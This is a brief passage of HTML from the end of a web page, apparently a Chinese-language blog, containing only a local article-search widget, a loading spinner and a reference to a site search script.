class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=4.13.0"></script></div></div></body></html>
